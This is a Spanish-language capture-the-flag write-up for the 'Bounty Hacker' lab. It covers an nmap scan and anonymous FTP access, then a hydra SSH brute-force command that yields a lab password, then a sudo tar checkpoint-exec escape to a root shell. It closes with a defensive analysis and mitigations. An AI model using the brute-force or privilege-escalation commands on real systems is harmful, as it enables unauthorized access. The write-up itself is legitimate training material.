# Bounty Hacker
Esta guay pero por el nombre me esperaba otro tipo de cosa, en plan algo mas rollo bug bounty idk

## Initial Scan
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.95.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

```
## Enum
### FTP
Tenemos login Anonymous habilitado, asi que accedemos como Anonymous y vemos los dos archivos presentes
```
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
```
Nos traemos los dos a local y vemos que locks es algo que parece una lista de contraseñas, el otro parece parte del lore de la room, aunque nos deja un usuario, lin

```
hydra -l lin -P locks.txt ssh://10.10.239.220
[22][ssh] host: 10.10.239.220   login: lin   password: RedDr4gonSynd1cat3

```

Nos conectamos como lin y leemos la user.txt

## Privesc
```
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
Ejecutamos
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
Y listo

# Analisís de la intrusión
### FTP login anonymous habilitado
Una mala decisión en cuanto a la configuración en el servidor FTP por parte del administrador (habilitar el login anonymous) , nos permitio acceder a  archivos sensibles, aunque en este caso se habian tomado medidas de mitigación
### SSH Bruteforcing allowed
No existe ningún tipo de medida para evitar ataques por fuerza bruta contra el servidor, si bien la contraseña es segura,  teoricamente sin protecciones al respecto sería posible obtener acceso aunque el tiempo sería elevado
### Privileged tar execuition
El usuario lin puede utilizar tar como root, lo cual nos permitio elevar privilegios a root
# Soluciones
### SSH Bruteforcing allowed
Si bien la contraseña es robusta utilizar algún tipo de protección como fail2ban en el servidor sería altamaente recomendables
### Privileged tar execution
Permitir a un usuario regular ejecutar tar como root no parece algo con mucho sentido, la principal opción para mitigar esto seria eliminar este permiso si por algún casual se diese un caso en el que esto fuera necesario lo ideal seria introducir el comando entero en /etc/sudoers limitando bastante la explotación y aun asi lo optimo seria establecer una politica de Seccomp al respecto
